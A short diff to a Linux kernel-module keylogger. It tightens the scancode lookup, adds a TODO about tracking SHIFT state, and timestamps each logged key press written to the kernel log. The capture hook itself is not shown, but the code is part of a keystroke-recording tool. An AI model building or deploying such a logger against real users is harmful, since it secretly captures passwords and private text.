@@ -73,7 +73,8 @@ START_LAYOUT(scancode_set1)
 END_LAYOUT
 
 static int scanset_contains(int scancode) {
-	return 0 <= scancode && scancode < sizeof(scancode_set1) / sizeof(*scancode_set1);
+	return 0 <= scancode && scancode < sizeof(scancode_set1) / sizeof(*scancode_set1)
+		&& scancode_set1[scancode].name != NULL;
 }
 
 // When reading a key from the keyboard, we'll get a bit telling us if the key
@@ -93,6 +94,7 @@ struct keylog_entry {
 
 // The main structure we'll keep around. Allows having multiple keylogger files
 // open at the same time.
+// TODO: Handle state, such as if SHIFT is currently held.
 struct keylog_list {
 	struct list_head head;
 	wait_queue_head_t queue;
@@ -287,9 +289,10 @@ static int keylog_device_release(struct inode *inode, struct file *file) {
 	list_for_each_safe(cur, q, &list->head) {
 		e = list_entry(cur, struct keylog_entry, keylog_list);
 
-		if (scanset_contains(e->keycode) && e->state == KEY_PRESS)
-			printk(KERN_INFO "Keylog: %#.2x (%s) - %s\n", e->keycode, scancode_set1[e->keycode].name, e->state == KEY_PRESS ? "Pressed" : "Released");
-
+		if (scanset_contains(e->keycode) && e->state == KEY_PRESS) {
+			printk(KERN_INFO "Keylog: %.2lu:%.2lu:%.2lu", (e->time.tv_sec / (60 * 60)) % 24, (e->time.tv_sec / 60) % 60, e->time.tv_sec % 60);
+			printk(KERN_CONT " %#.2x (%s) - %s", e->keycode, scancode_set1[e->keycode].name, e->state == KEY_PRESS ? "Pressed" : "Released");
+		}
 		list_del(cur);
 		kfree(e);
 	}
